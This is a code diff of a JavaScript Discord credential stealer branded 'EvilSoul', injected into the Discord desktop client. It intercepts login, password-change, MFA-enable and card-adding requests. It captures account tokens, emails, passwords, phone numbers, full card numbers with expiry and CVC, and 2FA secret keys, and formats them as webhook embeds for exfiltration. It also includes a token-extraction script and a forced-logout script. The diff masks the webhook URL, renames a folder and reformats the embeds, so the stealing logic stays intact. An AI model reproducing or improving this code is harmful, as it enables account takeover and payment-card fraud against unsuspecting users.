@@ -10,7 +10,7 @@ var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in 
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
 
 const dataNow = new Date().toISOString();
-const webhook = 'https://discord.com/api/webhooks/1365381445266313256/04JKVrDYTo1Vkqe8oGPH167tiZJAfLoU3B8imvFxh8auxwH8qbIViptIuAlsDXA5ZACb'
+const webhook = '####'
 
 let contents2FA = []
 
@@ -73,11 +73,11 @@ const getURL = async (url, token) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<a:kkkk:1326846144818708523>"), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
 }
 
 const GetNSFW = (bouki) => {
@@ -93,9 +93,9 @@ const GetNSFW = (bouki) => {
 const GetA2F = (bouki) => {
     switch (bouki) {
         case true:
-            return "`MFA Enabled`"
+            return "`Enabled`"
         case false:
-            return "`MFA Not Enabled`"
+            return "`Not Enabled`"
         default:
             return "WTF DONT HAVES MFA OR HAVES?????"
     }
@@ -122,23 +122,23 @@ const parseFriends = friends => {
 }
 
 const parseBilling = billings => {
-    var Billings = ""
+    var Billings = " "
     try{
-    if(!billings) return Billings = ":x:";
+    if(!billings) return Billings = "No billing";
     billings.forEach(res => {
         if (res.invalid) return
         switch (res.type) {
             case 1:
-                Billings += ":heavy_check_mark: :credit_card:"
+                Billings += ":credit_card:"
                 break
             case 2:
-                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
+                Billings += "<:paypal:896441236062347374>"
         }
     })
-    if (!Billings) Billings = ":x:"
+    if (!Billings) Billings = "No billing"
     return Billings
 }catch(err){
-    return ":x:"
+    return " "
 }
 }
 
@@ -147,7 +147,7 @@ const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
 const GetNitro = r => {
     switch (r.premium_type) {
         default:
-            return ""
+            return " "
         case 1:
             return "<:946246402105819216:962747802797113365>"
         case 2:
@@ -261,8 +261,8 @@ async function initOne() {
     return true;
   }
 
-  if (!fs.existsSync(__dirname + "/Nikki")) {
-    fs.mkdirSync(__dirname + "/Nikki");
+  if (!fs.existsSync(__dirname + "/EvilSoul")) {
+    fs.mkdirSync(__dirname + "/EvilSoul");
   }else {
     return true;
   }
@@ -359,10 +359,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
   userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
 
-  var {
-      appPath,
-      appName
-  } = path
+  var { appPath,appName } = path
   var client_discord = appName
 
   var password_to2fa
@@ -387,42 +384,13 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const embedLogin = {
         color: 0x530000,
         fields: [
-            {
-                name: "Token:",
-                value: "```"+token+"```",
-                inline: false
-              },
-              {
-                name: "Badges:",
-                value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`,
-                inline: true
-              },    
-              {
-                name: "Billing:",
-                value: Billings,
-                inline: true
-              },
-              {
-                name: "MFA:",
-                value: GetA2F(user.mfa_enabled),
-                inline: true
-              },
-              {
-                name: "Email:",
-                value: "`"+user.email+"`",
-                inline: true
-              },
-              {
-                name: "Password:",
-                value: "`"+password+"`",
-                inline: true
-              },
-              {
-                name: "Phone:",
-                value: "`"+user.phone+"`",
-                inline: true
-              },
-
+            { name: "Token:", value: "```"+token+"```", inline: false },
+            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },    
+            { name: "Billing:", value: Billings, inline: true },
+            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
+            { name: "Email:", value: "`"+user.email+"`", inline: true },
+            { name: "Password:", value: "`"+password+"`", inline: true },
+            { name: "Phone:", value: "`"+user.phone+"`", inline: true },  
         ],
         author: {
           name: `${user.username} (${user.id})`,
@@ -451,54 +419,16 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const embedLogin3 = {
         color: 0x530000,
         fields: [
-            {
-                name: "Token:",
-                value: "```"+token+"```",
-                inline: false
-              },
-              {
-                name: "Badges:",
-                value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`,
-                inline: true
-              },
-              {
-                name: "Billing:",
-                value: Billings,
-                inline: true
-              },
-              {
-                name: "MFA:",
-                value: GetA2F(user.mfa_enabled),
-                inline: true
-              },
-          {
-            name: "Email:",
-            value: "`"+user.email+"`",
-            inline: true
-          },
-          {
-            name: "Password:",
-            value: "`"+passwdddd+"`",
-            inline: true
-          },
-          {
-            name: "Phone:",
-            value: "`"+user.phone+"`",
-            inline: true
-          },
-
-
-
-
+          { name: "Token:", value: "```"+token+"```", inline: false },
+          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
+          { name: "Billing:", value: Billings, inline: true },
+          { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
+          { name: "Email:", value: "`"+user.email+"`", inline: true },
+          { name: "Password:", value: "`"+passwdddd+"`", inline: true },
+          { name: "Phone:", value: "`"+user.phone+"`", inline: true },
         ],
-        author: {
-          name: `${user.username} (${user.id})`,
-          icon_url: userAvatar
-        },
-        footer: {
-          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-          text: "EvilSoul | t.me/EvilSoulStealer"
-        },
+        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
+        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
         timestamp: dataNow,
       }
 
@@ -525,54 +455,18 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const embedCard = {
         color: 0x590000,
         fields: [
-            {
-                name: "Token:",
-                value: "```"+token+"```",
-                inline: false
-              },
-              {
-                name: "Badges:",
-                value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`,
-                inline: true
-              },
-          {
-            name: "Email:",
-            value: "`"+user.email+"`",
-            inline: true
-          },
-          {
-            name: "Phone:",
-            value: "`"+user.phone+"`",
-            inline: true
-          },
-       
-          {
-            name: "Card Number:",
-            value: "`"+card_number+"`",
-            inline: true
-          },
-          {
-            name: "Expiration Date:",
-            value: "`"+exp_month+"/"+exp_year+"`",
-            inline: true
-          },
-          {
-            name: "CVC:",
-            value: "`"+cvc+"`",
-            inline: true
-          },
-,
+          { name: "Token:", value: "```" + token + "```", inline: false },
+          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
+          { name: "Email:", value: "`" + user.email + "`", inline: true },
+          { name: "Phone:", value: "`" + user.phone + "`", inline: true },
+          { name: "Card Number:", value: "`" + card_number + "`", inline: true },
+          { name: "Expiration Date:", value: "`" + exp_month + "/" + exp_year + "`", inline: true },
+          { name: "CVC:", value: "`" + cvc + "`", inline: true }
         ],
-        "author": {
-          name: `${user.username} (${user.id})`,
-          icon_url: userAvatar,
-        },
-        footer: {
-          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-          text: "EvilSoul | t.me/EvilSoulStealer"
-        },
-        timestamp: dataNow,
-      };
+        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
+        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
+        timestamp: dataNow
+      };      
 
       const webhookData = {
         embeds: [embedCard],
@@ -593,52 +487,16 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const embedNewPasswd = {
         color: 0x590000,
         fields: [
-            {
-                name: "New Token",
-                value: "```"+new_token+"```",
-                inline: true
-              },
-              {
-                name: "Badges:",
-                value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`,
-                inline: true
-              },
-          {
-            name: "Email",
-            value: "`"+user.email+"`",
-            inline: true
-          },
-          {
-            name: "Phone",
-            value: "`"+user.phone+"`",
-            inline: true
-          },
-
-          {
-            name: "Old Password",
-            value: "`"+old_passwd+"`",
-            inline: true
-          },
-          {
-            name: "New Password",
-            value: "`"+new_passwd+"`",
-            inline: true
-          },
-          {
-            name: "2FA Enable:",
-            value: GetA2F(user.mfa_enabled),
-            inline: true
-          },
-
+            { name: "New Token",  value: "```"+new_token+"```", inline: true },
+            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
+            { name: "Email", value: "`"+user.email+"`", inline: true },
+            { name: "Phone", value: "`"+user.phone+"`", inline: true },
+            { name: "Old Password", value: "`"+old_passwd+"`", inline: true },
+            { name: "New Password", value: "`"+new_passwd+"`", inline: true },
+            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
         ],
-        author: {
-          name: `${user.username} (${user.id})`,
-          icon_url: userAvatar
-        },
-        footer: {
-          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-          text: "EvilSoul | t.me/EvilSoulStealer",
-        },
+        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
+        footer: {icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
         timestamp: dataNow,
       }
 
@@ -659,36 +517,13 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const embedMFAENABLED = {
         color: 0x590000,
         fields: [
-            {
-                name: "New Token",
-                value: "```"+new_token+"```",
-                inline: false
-              },
-          {
-            name: "Email",
-            value: "`"+user.email+"`",
-            inline: true
-          },
-          {
-            name: "Password",
-            value: "`"+password+"`",
-            inline: true
-          },
-          {
-            name: "Secret Key (PUT IN GOOGLE AUTHENTICATOR)",
-            value: "`"+secret+"`",
-            inline: false
-          },
-
+            { name: "New Token",  value: "```"+new_token+"```", inline: false },
+            { name: "Email", value: "`"+user.email+"`", inline: true },
+            { name: "Password", value: "`"+password+"`", inline: true },
+            { name: "Secret Key (PUT IN GOOGLE AUTHENTICATOR)", value: "`"+secret+"`", inline: false },
         ],
-        author: {
-          name: `${user.username} (${user.id})` ,
-          icon_url: userAvatar
-        },
-        footer: {
-          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
-          text: "EvilSoul | t.me/EvilSoulStealer",
-        },
+        author: { name: `${user.username} (${user.id})` , icon_url: userAvatar },
+        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
         timestamp: dataNow,
       }
 
